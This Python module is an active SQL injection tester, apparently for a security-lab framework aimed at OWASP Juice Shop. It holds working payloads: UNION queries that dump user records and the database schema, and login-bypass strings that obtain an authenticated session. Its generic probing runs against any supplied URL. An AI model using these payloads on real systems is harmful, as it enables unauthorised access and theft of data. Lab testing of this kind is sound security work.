"""Web Security Module - SQL Injection Tester."""

from __future__ import annotations

import logging
import time
from typing import Dict, List
from urllib.parse import urlencode, urljoin

import requests

from backend.modules.local_lab import JuiceShopLab

logger = logging.getLogger(__name__)


class SQLITester:
    """Active SQLi probe for local labs using safe payload variants."""

    def __init__(self):
        self.name = "SQL Injection Tester"
        self.version = "2.1.0"
        self.mitre_id = "T1190"
        self.severity = "High"
        self.test_payloads = [
            {"name": "Basic quote test", "payload": "'"},
            {"name": "Union test", "payload": "' UNION SELECT NULL--"},
            {"name": "Boolean test", "payload": "' OR '1'='1"},
        ]
        self.paths = ["/", "/search", "/products", "/items", "/login"]
        self.parameters = ["id", "q", "search", "item", "username", "email"]

    async def execute(self, config: Dict) -> Dict:
        target = config.get("target", {})
        url = target.get("url")
        attack_type = config.get("attack_type")

        logger.info("[SQLI] Starting SQL injection detection on %s", url)

        results = {
            "module": "sqli",
            "target": url,
            "tests": [],
            "vulnerabilities": [],
            "actions": [],
            "timestamp": time.time(),
        }

        if not url:
            results["error"] = "No target URL provided"
            return results

        session = requests.Session()

        try:
            juice_shop = JuiceShopLab(url)
            if juice_shop.is_match():
                if attack_type == "union_search_injection":
                    probes = [
                        "' UNION SELECT * FROM Users--",
                        "' UNION SELECT sql,sql,sql,sql,sql,sql,sql,sql FROM sqlite_master--",
                    ]
                    for payload in probes:
                        probe = juice_shop.search(payload)
                        results["actions"].append(probe["action"])
                        response = probe["response"]
                        if response is None:
                            continue
                        vulnerable = response.status_code == 200 and ("@juice-sh.op" in response.text or "CREATE TABLE" in response.text)
                        test_result = {
                            "parameter": "q",
                            "payload": payload,
                            "endpoint": probe["action"]["endpoint"],
                            "method": "GET",
                            "vulnerable": vulnerable,
                            "confidence": 0.92 if vulnerable else 0.2,
                            "evidence": "Search response leaked union-selected records or schema text." if vulnerable else None,
                            "mitre_id": self.mitre_id,
                            "severity": self.severity,
                            "type": "Union SQL Injection",
                        }
                        results["tests"].append(test_result)
                        if vulnerable:
                            results["vulnerabilities"].append(test_result)
                            return results
                else:
                    payloads = [
                        ("' OR 1=1--", "authentication bypass payload"),
                        ("admin@juice-sh.op'--", "quoted comment payload"),
                    ]
                    for email_payload, label in payloads:
                        auth_result, action = juice_shop.login(email_payload, "irrelevant")
                        action["action"] = "sqli_login_probe"
                        action["summary"] = f"Sent Juice Shop SQLi login probe using {label}."
                        results["actions"].append(action)

                        if auth_result:
                            results["actions"].extend(
                                juice_shop.verify_session(
                                    auth_result["token"],
                                    auth_result.get("basket_id"),
                                )
                            )
                            finding = {
                                "parameter": "email",
                                "payload": email_payload,
                                "endpoint": action["endpoint"],
                                "method": "POST",
                                "vulnerable": True,
                                "confidence": 0.95,
                                "evidence": "SQL injection payload produced an authenticated session.",
                                "mitre_id": self.mitre_id,
                                "severity": self.severity,
                                "type": "Login Admin",
                            }
                            results["tests"].append(finding)
                            results["vulnerabilities"].append(finding)
                            return results

                return results

            for path in self.paths:
                endpoint = urljoin(f"{url.rstrip('/')}/", path.lstrip("/"))

                try:
                    baseline = session.get(endpoint, timeout=5)
                except Exception:
                    continue

                baseline_length = len(baseline.text)

                for parameter in self.parameters:
                    for payload in self.test_payloads:
                        query = urlencode({parameter: payload["payload"]})
                        test_url = f"{endpoint}?{query}"

                        try:
                            response = session.get(test_url, timeout=5)
                        except Exception as request_error:
                            logger.warning("[SQLI] Request failed: %s", request_error)
                            continue

                        length_diff = abs(len(response.text) - baseline_length)
                        error_detected = self._contains_sql_error(response.text)
                        vulnerable = error_detected or length_diff > 150

                        test_result = {
                            "parameter": parameter,
                            "payload": payload["payload"],
                            "endpoint": endpoint,
                            "method": "GET",
                            "vulnerable": vulnerable,
                            "confidence": 0.9 if error_detected else 0.65 if vulnerable else 0.2,
                            "evidence": (
                                "SQL error message detected in response"
                                if error_detected
                                else f"Response length changed by {length_diff} bytes"
                                if vulnerable
                                else None
                            ),
                            "mitre_id": self.mitre_id,
                        }

                        results["tests"].append(test_result)

                        if vulnerable:
                            results["vulnerabilities"].append(test_result)
                            return results

            return results
        except Exception as exc:
            logger.error("[SQLI] Execution failed: %s", exc)
            results["error"] = str(exc)
            return results

    def _contains_sql_error(self, text: str) -> bool:
        sql_error_patterns = [
            "sql syntax",
            "mysql_fetch",
            "ora-",
            "syntax error",
            "warning: mysql",
            "unclosed quotation mark",
            "odbc",
            "pdoexception",
            "sqlite error",
        ]
        lowered = text.lower()
        return any(pattern in lowered for pattern in sql_error_patterns)

    def get_metadata(self) -> Dict:
        return {
            "name": self.name,
            "version": self.version,
            "mitre_id": self.mitre_id,
            "severity": self.severity,
        }
